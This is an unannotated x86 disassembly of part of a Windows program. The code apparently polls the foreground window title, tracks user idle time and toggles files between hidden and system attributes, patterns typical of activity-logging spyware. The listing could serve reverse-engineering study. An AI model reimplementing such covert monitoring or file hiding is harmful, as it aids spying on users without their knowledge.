  403ad5:	88 46 2f             	mov    %al,0x2f(%esi)
  403ad8:	ff 15 54 02 41 00    	call   *0x410254
  403ade:	5e                   	pop    %esi
  403adf:	5d                   	pop    %ebp
  403ae0:	c2 14 00             	ret    $0x14
  403ae3:	55                   	push   %ebp
  403ae4:	8b ec                	mov    %esp,%ebp
  403ae6:	81 ec 04 06 00 00    	sub    $0x604,%esp
  403aec:	53                   	push   %ebx
  403aed:	8b d9                	mov    %ecx,%ebx
  403aef:	56                   	push   %esi
  403af0:	57                   	push   %edi
  403af1:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  403af4:	8d 73 04             	lea    0x4(%ebx),%esi
  403af7:	68 10 27 00 00       	push   $0x2710
  403afc:	ff 15 8c 01 41 00    	call   *0x41018c
  403b02:	68 68 06 41 00       	push   $0x410668
  403b07:	56                   	push   %esi
  403b08:	ff 15 a4 02 41 00    	call   *0x4102a4
  403b0e:	59                   	pop    %ecx
  403b0f:	84 c0                	test   %al,%al
  403b11:	59                   	pop    %ecx
  403b12:	0f 84 71 02 00 00    	je     0x403d89
  403b18:	8d 7b 50             	lea    0x50(%ebx),%edi
  403b1b:	8b cf                	mov    %edi,%ecx
  403b1d:	ff 15 58 02 41 00    	call   *0x410258
  403b23:	50                   	push   %eax
  403b24:	ff 15 5c 01 41 00    	call   *0x41015c
  403b2a:	a8 02                	test   $0x2,%al
  403b2c:	74 14                	je     0x403b42
  403b2e:	68 80 00 00 00       	push   $0x80
  403b33:	8b cf                	mov    %edi,%ecx
  403b35:	ff 15 58 02 41 00    	call   *0x410258
  403b3b:	50                   	push   %eax
  403b3c:	ff 15 60 01 41 00    	call   *0x410160
  403b42:	6a 12                	push   $0x12
  403b44:	b9 40 59 41 00       	mov    $0x415940,%ecx
  403b49:	e8 3b d7 ff ff       	call   0x401289
  403b4e:	8b c8                	mov    %eax,%ecx
  403b50:	ff 15 34 02 41 00    	call   *0x410234
  403b56:	80 38 00             	cmpb   $0x0,(%eax)
  403b59:	75 55                	jne    0x403bb0
  403b5b:	6a 01                	push   $0x1
  403b5d:	6a 0a                	push   $0xa
  403b5f:	8b cf                	mov    %edi,%ecx
  403b61:	ff 15 58 02 41 00    	call   *0x410258
  403b67:	50                   	push   %eax
  403b68:	8d 8d 08 fe ff ff    	lea    -0x1f8(%ebp),%ecx
  403b6e:	ff 15 2c 02 41 00    	call   *0x41022c
  403b74:	8d 8d 08 fe ff ff    	lea    -0x1f8(%ebp),%ecx
  403b7a:	ff 15 30 02 41 00    	call   *0x410230
  403b80:	84 c0                	test   %al,%al
  403b82:	74 1b                	je     0x403b9f
  403b84:	8d 85 08 fe ff ff    	lea    -0x1f8(%ebp),%eax
  403b8a:	56                   	push   %esi
  403b8b:	50                   	push   %eax
  403b8c:	e8 b9 c0 00 00       	call   0x40fc4a
  403b91:	59                   	pop    %ecx
  403b92:	59                   	pop    %ecx
  403b93:	8d 8d 08 fe ff ff    	lea    -0x1f8(%ebp),%ecx
  403b99:	ff 15 fc 02 41 00    	call   *0x4102fc
  403b9f:	8d 8d 08 fe ff ff    	lea    -0x1f8(%ebp),%ecx
  403ba5:	ff 15 f8 02 41 00    	call   *0x4102f8
  403bab:	e9 a2 01 00 00       	jmp    0x403d52
  403bb0:	8d 45 ff             	lea    -0x1(%ebp),%eax
  403bb3:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403bb6:	50                   	push   %eax
  403bb7:	33 db                	xor    %ebx,%ebx
  403bb9:	ff 15 50 02 41 00    	call   *0x410250
  403bbf:	be 50 59 41 00       	mov    $0x415950,%esi
  403bc4:	8b ce                	mov    %esi,%ecx
  403bc6:	ff 15 a0 02 41 00    	call   *0x4102a0
  403bcc:	50                   	push   %eax
  403bcd:	8b ce                	mov    %esi,%ecx
  403bcf:	ff 15 34 02 41 00    	call   *0x410234
  403bd5:	50                   	push   %eax
  403bd6:	8d 8d fc f9 ff ff    	lea    -0x604(%ebp),%ecx
  403bdc:	e8 0a ed ff ff       	call   0x4028eb
  403be1:	8b cf                	mov    %edi,%ecx
  403be3:	ff 15 58 02 41 00    	call   *0x410258
  403be9:	50                   	push   %eax
  403bea:	e8 5d b8 00 00       	call   0x40f44c
  403bef:	84 c0                	test   %al,%al
  403bf1:	59                   	pop    %ecx
  403bf2:	0f 84 a9 00 00 00    	je     0x403ca1
  403bf8:	6a 01                	push   $0x1
  403bfa:	6a 25                	push   $0x25
  403bfc:	8b cf                	mov    %edi,%ecx
  403bfe:	ff 15 58 02 41 00    	call   *0x410258
  403c04:	50                   	push   %eax
  403c05:	8d 8d 38 ff ff ff    	lea    -0xc8(%ebp),%ecx
  403c0b:	ff 15 f4 02 41 00    	call   *0x4102f4
  403c11:	8d 8d 38 ff ff ff    	lea    -0xc8(%ebp),%ecx
  403c17:	ff 15 f0 02 41 00    	call   *0x4102f0
  403c1d:	84 c0                	test   %al,%al
  403c1f:	74 74                	je     0x403c95
  403c21:	8d 85 20 ff ff ff    	lea    -0xe0(%ebp),%eax
  403c27:	8d 8d 38 ff ff ff    	lea    -0xc8(%ebp),%ecx
  403c2d:	50                   	push   %eax
  403c2e:	ff 15 ec 02 41 00    	call   *0x4102ec
  403c34:	8b c8                	mov    %eax,%ecx
  403c36:	e8 4d 16 00 00       	call   0x405288
  403c3b:	8b f0                	mov    %eax,%esi
  403c3d:	56                   	push   %esi
  403c3e:	ff 15 7c 03 41 00    	call   *0x41037c
  403c44:	59                   	pop    %ecx
  403c45:	8b d8                	mov    %eax,%ebx
  403c47:	6a 00                	push   $0x0
  403c49:	6a 00                	push   $0x0
  403c4b:	8d 8d 38 ff ff ff    	lea    -0xc8(%ebp),%ecx
  403c51:	ff 15 e8 02 41 00    	call   *0x4102e8
  403c57:	56                   	push   %esi
  403c58:	53                   	push   %ebx
  403c59:	8d 8d 38 ff ff ff    	lea    -0xc8(%ebp),%ecx
  403c5f:	ff 15 e4 02 41 00    	call   *0x4102e4
  403c65:	8d 8d 38 ff ff ff    	lea    -0xc8(%ebp),%ecx
  403c6b:	ff 15 e0 02 41 00    	call   *0x4102e0
  403c71:	56                   	push   %esi
  403c72:	8d 45 c8             	lea    -0x38(%ebp),%eax
  403c75:	53                   	push   %ebx
  403c76:	50                   	push   %eax
  403c77:	8d 8d fc f9 ff ff    	lea    -0x604(%ebp),%ecx
  403c7d:	e8 a8 ed ff ff       	call   0x402a2a
  403c82:	50                   	push   %eax
  403c83:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403c86:	ff 15 64 02 41 00    	call   *0x410264
  403c8c:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  403c8f:	ff 15 54 02 41 00    	call   *0x410254
  403c95:	8d 8d 38 ff ff ff    	lea    -0xc8(%ebp),%ecx
  403c9b:	ff 15 dc 02 41 00    	call   *0x4102dc
  403ca1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403ca4:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403ca7:	8d 70 04             	lea    0x4(%eax),%esi
  403caa:	56                   	push   %esi
  403cab:	ff 15 94 02 41 00    	call   *0x410294
  403cb1:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403cb4:	ff 15 a0 02 41 00    	call   *0x4102a0
  403cba:	50                   	push   %eax
  403cbb:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403cbe:	ff 15 58 02 41 00    	call   *0x410258
  403cc4:	50                   	push   %eax
  403cc5:	8d 45 d8             	lea    -0x28(%ebp),%eax
  403cc8:	50                   	push   %eax
  403cc9:	8d 8d fc f9 ff ff    	lea    -0x604(%ebp),%ecx
  403ccf:	e8 56 ed ff ff       	call   0x402a2a
  403cd4:	6a 01                	push   $0x1
  403cd6:	6a 32                	push   $0x32
  403cd8:	8b cf                	mov    %edi,%ecx
  403cda:	ff 15 58 02 41 00    	call   *0x410258
  403ce0:	50                   	push   %eax
  403ce1:	8d 8d 94 fe ff ff    	lea    -0x16c(%ebp),%ecx
  403ce7:	ff 15 2c 02 41 00    	call   *0x41022c
  403ced:	8d 8d 94 fe ff ff    	lea    -0x16c(%ebp),%ecx
  403cf3:	ff 15 30 02 41 00    	call   *0x410230
  403cf9:	84 c0                	test   %al,%al
  403cfb:	74 2c                	je     0x403d29
  403cfd:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403d00:	ff 15 a0 02 41 00    	call   *0x4102a0
  403d06:	50                   	push   %eax
  403d07:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403d0a:	ff 15 58 02 41 00    	call   *0x410258
  403d10:	50                   	push   %eax
  403d11:	8d 8d 94 fe ff ff    	lea    -0x16c(%ebp),%ecx
  403d17:	ff 15 7c 02 41 00    	call   *0x41027c
  403d1d:	8d 8d 94 fe ff ff    	lea    -0x16c(%ebp),%ecx
  403d23:	ff 15 fc 02 41 00    	call   *0x4102fc
  403d29:	53                   	push   %ebx
  403d2a:	ff 15 80 03 41 00    	call   *0x410380
  403d30:	59                   	pop    %ecx
  403d31:	8d 8d 94 fe ff ff    	lea    -0x16c(%ebp),%ecx
  403d37:	ff 15 f8 02 41 00    	call   *0x4102f8
  403d3d:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403d40:	ff 15 54 02 41 00    	call   *0x410254
  403d46:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403d49:	ff 15 54 02 41 00    	call   *0x410254
  403d4f:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  403d52:	68 68 06 41 00       	push   $0x410668
  403d57:	8b ce                	mov    %esi,%ecx
  403d59:	ff 15 d8 02 41 00    	call   *0x4102d8
  403d5f:	6a 13                	push   $0x13
  403d61:	b9 40 59 41 00       	mov    $0x415940,%ecx
  403d66:	e8 1e d5 ff ff       	call   0x401289
  403d6b:	8b c8                	mov    %eax,%ecx
  403d6d:	ff 15 34 02 41 00    	call   *0x410234
  403d73:	80 38 00             	cmpb   $0x0,(%eax)
  403d76:	74 11                	je     0x403d89
  403d78:	6a 06                	push   $0x6
  403d7a:	8b cf                	mov    %edi,%ecx
  403d7c:	ff 15 58 02 41 00    	call   *0x410258
  403d82:	50                   	push   %eax
  403d83:	ff 15 60 01 41 00    	call   *0x410160
  403d89:	80 7b 38 00          	cmpb   $0x0,0x38(%ebx)
  403d8d:	0f 85 64 fd ff ff    	jne    0x403af7
  403d93:	5f                   	pop    %edi
  403d94:	5e                   	pop    %esi
  403d95:	33 c0                	xor    %eax,%eax
  403d97:	5b                   	pop    %ebx
  403d98:	c9                   	leave
  403d99:	c3                   	ret
  403d9a:	55                   	push   %ebp
  403d9b:	8b ec                	mov    %esp,%ebp
  403d9d:	81 ec 3c 05 00 00    	sub    $0x53c,%esp
  403da3:	53                   	push   %ebx
  403da4:	56                   	push   %esi
  403da5:	8b d9                	mov    %ecx,%ebx
  403da7:	8d 45 fb             	lea    -0x5(%ebp),%eax
  403daa:	57                   	push   %edi
  403dab:	50                   	push   %eax
  403dac:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403daf:	ff 15 50 02 41 00    	call   *0x410250
  403db5:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  403db9:	74 07                	je     0x403dc2
  403dbb:	68 ec 07 41 00       	push   $0x4107ec
  403dc0:	eb 05                	jmp    0x403dc7
  403dc2:	68 e0 07 41 00       	push   $0x4107e0
  403dc7:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  403dca:	ff 15 d8 02 41 00    	call   *0x4102d8
  403dd0:	6a 01                	push   $0x1
  403dd2:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  403dd8:	e8 04 e3 ff ff       	call   0x4020e1
  403ddd:	83 ec 10             	sub    $0x10,%esp
  403de0:	be 78 52 41 00       	mov    $0x415278,%esi
  403de5:	8b fc                	mov    %esp,%edi
  403de7:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  403ded:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403dee:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403def:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403df0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403df1:	e8 72 e3 ff ff       	call   0x402168
  403df6:	8d 73 50             	lea    0x50(%ebx),%esi
  403df9:	8b ce                	mov    %esi,%ecx
  403dfb:	ff 15 a8 02 41 00    	call   *0x4102a8
  403e01:	84 c0                	test   %al,%al
  403e03:	0f 85 f4 01 00 00    	jne    0x403ffd
  403e09:	6a 01                	push   $0x1
  403e0b:	6a 25                	push   $0x25
  403e0d:	8b ce                	mov    %esi,%ecx
  403e0f:	ff 15 58 02 41 00    	call   *0x410258
  403e15:	50                   	push   %eax
  403e16:	8d 8d d0 fe ff ff    	lea    -0x130(%ebp),%ecx
  403e1c:	ff 15 f4 02 41 00    	call   *0x4102f4
  403e22:	8d 8d d0 fe ff ff    	lea    -0x130(%ebp),%ecx
  403e28:	ff 15 f0 02 41 00    	call   *0x4102f0
  403e2e:	84 c0                	test   %al,%al
  403e30:	0f 84 bb 01 00 00    	je     0x403ff1
  403e36:	8d 45 b0             	lea    -0x50(%ebp),%eax
  403e39:	8d 8d d0 fe ff ff    	lea    -0x130(%ebp),%ecx
  403e3f:	50                   	push   %eax
  403e40:	ff 15 ec 02 41 00    	call   *0x4102ec
  403e46:	8b c8                	mov    %eax,%ecx
  403e48:	e8 3b 14 00 00       	call   0x405288
  403e4d:	8b f8                	mov    %eax,%edi
  403e4f:	57                   	push   %edi
  403e50:	e8 77 be 00 00       	call   0x40fccc
  403e55:	59                   	pop    %ecx
  403e56:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403e59:	6a 00                	push   $0x0
  403e5b:	6a 00                	push   $0x0
  403e5d:	8d 8d d0 fe ff ff    	lea    -0x130(%ebp),%ecx
  403e63:	ff 15 e8 02 41 00    	call   *0x4102e8
  403e69:	57                   	push   %edi
  403e6a:	8d 8d d0 fe ff ff    	lea    -0x130(%ebp),%ecx
  403e70:	ff 75 fc             	push   -0x4(%ebp)
  403e73:	ff 15 e4 02 41 00    	call   *0x4102e4
  403e79:	8d 8d d0 fe ff ff    	lea    -0x130(%ebp),%ecx
  403e7f:	ff 15 e0 02 41 00    	call   *0x4102e0
  403e85:	6a 12                	push   $0x12
  403e87:	b9 40 59 41 00       	mov    $0x415940,%ecx
  403e8c:	e8 f8 d3 ff ff       	call   0x401289
  403e91:	8b c8                	mov    %eax,%ecx
  403e93:	ff 15 34 02 41 00    	call   *0x410234
  403e99:	80 38 01             	cmpb   $0x1,(%eax)
  403e9c:	0f 85 a8 00 00 00    	jne    0x403f4a
  403ea2:	be 50 59 41 00       	mov    $0x415950,%esi
  403ea7:	8b ce                	mov    %esi,%ecx
  403ea9:	ff 15 a0 02 41 00    	call   *0x4102a0
  403eaf:	50                   	push   %eax
  403eb0:	8b ce                	mov    %esi,%ecx
  403eb2:	ff 15 34 02 41 00    	call   *0x410234
  403eb8:	50                   	push   %eax
  403eb9:	8d 8d c4 fa ff ff    	lea    -0x53c(%ebp),%ecx
  403ebf:	e8 27 ea ff ff       	call   0x4028eb
  403ec4:	57                   	push   %edi
  403ec5:	8d 45 c8             	lea    -0x38(%ebp),%eax
  403ec8:	ff 75 fc             	push   -0x4(%ebp)
  403ecb:	8d 8d c4 fa ff ff    	lea    -0x53c(%ebp),%ecx
  403ed1:	50                   	push   %eax
  403ed2:	e8 53 eb ff ff       	call   0x402a2a
  403ed7:	83 ec 10             	sub    $0x10,%esp
  403eda:	83 c3 70             	add    $0x70,%ebx
  403edd:	8b fc                	mov    %esp,%edi
  403edf:	be 68 52 41 00       	mov    $0x415268,%esi
  403ee4:	53                   	push   %ebx
  403ee5:	8d 45 c8             	lea    -0x38(%ebp),%eax
  403ee8:	56                   	push   %esi
  403ee9:	50                   	push   %eax
  403eea:	8d 45 e8             	lea    -0x18(%ebp),%eax
  403eed:	56                   	push   %esi
  403eee:	50                   	push   %eax
  403eef:	8d 45 b8             	lea    -0x48(%ebp),%eax
  403ef2:	50                   	push   %eax
  403ef3:	e8 1c bd 00 00       	call   0x40fc14
  403ef8:	83 c4 0c             	add    $0xc,%esp
  403efb:	50                   	push   %eax
  403efc:	8d 45 d8             	lea    -0x28(%ebp),%eax
  403eff:	50                   	push   %eax
  403f00:	e8 0f bd 00 00       	call   0x40fc14
  403f05:	83 c4 0c             	add    $0xc,%esp
  403f08:	50                   	push   %eax
  403f09:	8d 45 a0             	lea    -0x60(%ebp),%eax
  403f0c:	50                   	push   %eax
  403f0d:	e8 02 bd 00 00       	call   0x40fc14
  403f12:	83 c4 0c             	add    $0xc,%esp
  403f15:	50                   	push   %eax
  403f16:	57                   	push   %edi
  403f17:	e8 f8 bc 00 00       	call   0x40fc14
  403f1c:	83 c4 0c             	add    $0xc,%esp
  403f1f:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  403f25:	e8 6e e2 ff ff       	call   0x402198
  403f2a:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  403f2d:	ff 15 54 02 41 00    	call   *0x410254
  403f33:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403f36:	ff 15 54 02 41 00    	call   *0x410254
  403f3c:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  403f3f:	ff 15 54 02 41 00    	call   *0x410254
  403f45:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  403f48:	eb 7f                	jmp    0x403fc9
  403f4a:	83 ec 10             	sub    $0x10,%esp
  403f4d:	8d 43 70             	lea    0x70(%ebx),%eax
  403f50:	8b dc                	mov    %esp,%ebx
  403f52:	be 68 52 41 00       	mov    $0x415268,%esi
  403f57:	50                   	push   %eax
  403f58:	8d 45 0b             	lea    0xb(%ebp),%eax
  403f5b:	56                   	push   %esi
  403f5c:	50                   	push   %eax
  403f5d:	57                   	push   %edi
  403f5e:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  403f61:	ff 75 fc             	push   -0x4(%ebp)
  403f64:	ff 15 70 02 41 00    	call   *0x410270
  403f6a:	50                   	push   %eax
  403f6b:	8d 45 e8             	lea    -0x18(%ebp),%eax
  403f6e:	56                   	push   %esi
  403f6f:	50                   	push   %eax
  403f70:	8d 45 a0             	lea    -0x60(%ebp),%eax
  403f73:	50                   	push   %eax
  403f74:	e8 9b bc 00 00       	call   0x40fc14
  403f79:	83 c4 0c             	add    $0xc,%esp
  403f7c:	50                   	push   %eax
  403f7d:	8d 45 d8             	lea    -0x28(%ebp),%eax
  403f80:	50                   	push   %eax
  403f81:	e8 8e bc 00 00       	call   0x40fc14
  403f86:	83 c4 0c             	add    $0xc,%esp
  403f89:	50                   	push   %eax
  403f8a:	8d 45 b8             	lea    -0x48(%ebp),%eax
  403f8d:	50                   	push   %eax
  403f8e:	e8 81 bc 00 00       	call   0x40fc14
  403f93:	83 c4 0c             	add    $0xc,%esp
  403f96:	50                   	push   %eax
  403f97:	53                   	push   %ebx
  403f98:	e8 77 bc 00 00       	call   0x40fc14
  403f9d:	83 c4 0c             	add    $0xc,%esp
  403fa0:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  403fa6:	e8 ed e1 ff ff       	call   0x402198
  403fab:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  403fae:	ff 15 54 02 41 00    	call   *0x410254
  403fb4:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403fb7:	ff 15 54 02 41 00    	call   *0x410254
  403fbd:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  403fc0:	ff 15 54 02 41 00    	call   *0x410254
  403fc6:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  403fc9:	ff 15 54 02 41 00    	call   *0x410254
  403fcf:	ff 75 fc             	push   -0x4(%ebp)
  403fd2:	e8 55 bc 00 00       	call   0x40fc2c
  403fd7:	59                   	pop    %ecx
  403fd8:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  403fde:	e8 e4 e1 ff ff       	call   0x4021c7
  403fe3:	8d 8d d0 fe ff ff    	lea    -0x130(%ebp),%ecx
  403fe9:	ff 15 dc 02 41 00    	call   *0x4102dc
  403fef:	eb 6b                	jmp    0x40405c
  403ff1:	8d 8d d0 fe ff ff    	lea    -0x130(%ebp),%ecx
  403ff7:	ff 15 dc 02 41 00    	call   *0x4102dc
  403ffd:	83 ec 10             	sub    $0x10,%esp
  404000:	83 c3 70             	add    $0x70,%ebx
  404003:	8b fc                	mov    %esp,%edi
  404005:	be 68 52 41 00       	mov    $0x415268,%esi
  40400a:	53                   	push   %ebx
  40400b:	56                   	push   %esi
  40400c:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40400f:	56                   	push   %esi
  404010:	50                   	push   %eax
  404011:	8d 45 d8             	lea    -0x28(%ebp),%eax
  404014:	50                   	push   %eax
  404015:	e8 fa bb 00 00       	call   0x40fc14
  40401a:	83 c4 0c             	add    $0xc,%esp
  40401d:	50                   	push   %eax
  40401e:	8d 45 b8             	lea    -0x48(%ebp),%eax
  404021:	50                   	push   %eax
  404022:	e8 ed bb 00 00       	call   0x40fc14
  404027:	83 c4 0c             	add    $0xc,%esp
  40402a:	50                   	push   %eax
  40402b:	57                   	push   %edi
  40402c:	e8 e3 bb 00 00       	call   0x40fc14
  404031:	83 c4 0c             	add    $0xc,%esp
  404034:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  40403a:	e8 59 e1 ff ff       	call   0x402198
  40403f:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  404042:	ff 15 54 02 41 00    	call   *0x410254
  404048:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40404b:	ff 15 54 02 41 00    	call   *0x410254
  404051:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  404057:	e8 6b e1 ff ff       	call   0x4021c7
  40405c:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  404062:	e8 6f e1 ff ff       	call   0x4021d6
  404067:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40406a:	ff 15 54 02 41 00    	call   *0x410254
  404070:	5f                   	pop    %edi
  404071:	5e                   	pop    %esi
  404072:	5b                   	pop    %ebx
  404073:	c9                   	leave
  404074:	c2 04 00             	ret    $0x4
  404077:	55                   	push   %ebp
  404078:	8b ec                	mov    %esp,%ebp
  40407a:	83 ec 58             	sub    $0x58,%esp
  40407d:	53                   	push   %ebx
  40407e:	8b 1d 8c 01 41 00    	mov    0x41018c,%ebx
  404084:	56                   	push   %esi
  404085:	57                   	push   %edi
  404086:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  404089:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40408c:	80 78 38 00          	cmpb   $0x0,0x38(%eax)
  404090:	75 0a                	jne    0x40409c
  404092:	80 78 39 00          	cmpb   $0x0,0x39(%eax)
  404096:	0f 84 b1 01 00 00    	je     0x40424d
  40409c:	f6 05 40 57 41 00 01 	testb  $0x1,0x415740
  4040a3:	75 21                	jne    0x4040c6
  4040a5:	80 0d 40 57 41 00 01 	orb    $0x1,0x415740
  4040ac:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4040af:	50                   	push   %eax
  4040b0:	b9 48 57 41 00       	mov    $0x415748,%ecx
  4040b5:	ff 15 50 02 41 00    	call   *0x410250
  4040bb:	68 54 42 40 00       	push   $0x404254
  4040c0:	e8 f5 bb 00 00       	call   0x40fcba
  4040c5:	59                   	pop    %ecx
  4040c6:	68 f4 01 00 00       	push   $0x1f4
  4040cb:	ff d3                	call   *%ebx
  4040cd:	ff 15 e0 03 41 00    	call   *0x4103e0
  4040d3:	8b f8                	mov    %eax,%edi
  4040d5:	57                   	push   %edi
  4040d6:	ff 15 dc 03 41 00    	call   *0x4103dc
  4040dc:	8b f0                	mov    %eax,%esi
  4040de:	8d 45 fe             	lea    -0x2(%ebp),%eax
  4040e1:	50                   	push   %eax
  4040e2:	6a 00                	push   $0x0
  4040e4:	8d 46 01             	lea    0x1(%esi),%eax
  4040e7:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4040ea:	50                   	push   %eax
  4040eb:	ff 15 24 02 41 00    	call   *0x410224
  4040f1:	85 f6                	test   %esi,%esi
  4040f3:	0f 84 93 00 00 00    	je     0x40418c
  4040f9:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4040fc:	ff 15 a0 02 41 00    	call   *0x4102a0
  404102:	50                   	push   %eax
  404103:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404106:	ff 15 58 02 41 00    	call   *0x410258
  40410c:	50                   	push   %eax
  40410d:	57                   	push   %edi
  40410e:	ff 15 14 04 41 00    	call   *0x410414
  404114:	8d 45 d8             	lea    -0x28(%ebp),%eax
  404117:	68 48 57 41 00       	push   $0x415748
  40411c:	50                   	push   %eax
  40411d:	ff 15 28 02 41 00    	call   *0x410228
  404123:	59                   	pop    %ecx
  404124:	84 c0                	test   %al,%al
  404126:	59                   	pop    %ecx
  404127:	75 63                	jne    0x40418c
  404129:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40412c:	b9 48 57 41 00       	mov    $0x415748,%ecx
  404131:	50                   	push   %eax
  404132:	ff 15 64 02 41 00    	call   *0x410264
  404138:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40413b:	ff 15 a0 02 41 00    	call   *0x4102a0
  404141:	48                   	dec    %eax
  404142:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404145:	50                   	push   %eax
  404146:	ff 15 5c 02 41 00    	call   *0x41025c
  40414c:	6a 00                	push   $0x0
  40414e:	8d 45 d8             	lea    -0x28(%ebp),%eax
  404151:	83 ec 10             	sub    $0x10,%esp
  404154:	8b f4                	mov    %esp,%esi
  404156:	68 d8 07 41 00       	push   $0x4107d8
  40415b:	50                   	push   %eax
  40415c:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40415f:	68 d0 07 41 00       	push   $0x4107d0
  404164:	50                   	push   %eax
  404165:	e8 b0 ba 00 00       	call   0x40fc1a
  40416a:	83 c4 0c             	add    $0xc,%esp
  40416d:	50                   	push   %eax
  40416e:	56                   	push   %esi
  40416f:	e8 ac ba 00 00       	call   0x40fc20
  404174:	8b 7d f8             	mov    -0x8(%ebp),%edi
  404177:	83 c4 0c             	add    $0xc,%esp
  40417a:	8b cf                	mov    %edi,%ecx
  40417c:	e8 19 f9 ff ff       	call   0x403a9a
  404181:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  404184:	ff 15 54 02 41 00    	call   *0x410254
  40418a:	eb 03                	jmp    0x40418f
  40418c:	8b 7d f8             	mov    -0x8(%ebp),%edi
  40418f:	8b cf                	mov    %edi,%ecx
  404191:	e8 ac 0f 00 00       	call   0x405142
  404196:	e8 fd a6 00 00       	call   0x40e898
  40419b:	be 60 ea 00 00       	mov    $0xea60,%esi
  4041a0:	3b c6                	cmp    %esi,%eax
  4041a2:	0f 82 8e 00 00 00    	jb     0x404236
  4041a8:	80 7f 38 00          	cmpb   $0x0,0x38(%edi)
  4041ac:	75 0a                	jne    0x4041b8
  4041ae:	80 7f 39 00          	cmpb   $0x0,0x39(%edi)
  4041b2:	0f 84 8c 00 00 00    	je     0x404244
  4041b8:	e8 db a6 00 00       	call   0x40e898
  4041bd:	3b c6                	cmp    %esi,%eax
  4041bf:	72 0c                	jb     0x4041cd
  4041c1:	68 e8 03 00 00       	push   $0x3e8
  4041c6:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4041c9:	ff d3                	call   *%ebx
  4041cb:	eb db                	jmp    0x4041a8
  4041cd:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4041d0:	6a 0a                	push   $0xa
  4041d2:	50                   	push   %eax
  4041d3:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4041d6:	33 d2                	xor    %edx,%edx
  4041d8:	f7 f6                	div    %esi
  4041da:	50                   	push   %eax
  4041db:	ff 15 5c 03 41 00    	call   *0x41035c
  4041e1:	83 c4 0c             	add    $0xc,%esp
  4041e4:	8d 45 fd             	lea    -0x3(%ebp),%eax
  4041e7:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  4041ea:	6a 00                	push   $0x0
  4041ec:	83 ec 10             	sub    $0x10,%esp
  4041ef:	8b f4                	mov    %esp,%esi
  4041f1:	68 18 08 41 00       	push   $0x410818
  4041f6:	50                   	push   %eax
  4041f7:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4041fa:	50                   	push   %eax
  4041fb:	ff 15 4c 02 41 00    	call   *0x41024c
  404201:	50                   	push   %eax
  404202:	8d 45 b8             	lea    -0x48(%ebp),%eax
  404205:	68 fc 07 41 00       	push   $0x4107fc
  40420a:	50                   	push   %eax
  40420b:	e8 0a ba 00 00       	call   0x40fc1a
  404210:	83 c4 0c             	add    $0xc,%esp
  404213:	50                   	push   %eax
  404214:	56                   	push   %esi
  404215:	e8 06 ba 00 00       	call   0x40fc20
  40421a:	83 c4 0c             	add    $0xc,%esp
  40421d:	8b cf                	mov    %edi,%ecx
  40421f:	e8 76 f8 ff ff       	call   0x403a9a
  404224:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  404227:	ff 15 54 02 41 00    	call   *0x410254
  40422d:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  404230:	ff 15 54 02 41 00    	call   *0x410254
  404236:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404239:	ff 15 54 02 41 00    	call   *0x410254
  40423f:	e9 45 fe ff ff       	jmp    0x404089
  404244:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  404247:	ff 15 54 02 41 00    	call   *0x410254
  40424d:	5f                   	pop    %edi
  40424e:	5e                   	pop    %esi
  40424f:	33 c0                	xor    %eax,%eax
  404251:	5b                   	pop    %ebx
  404252:	c9                   	leave
  404253:	c3                   	ret
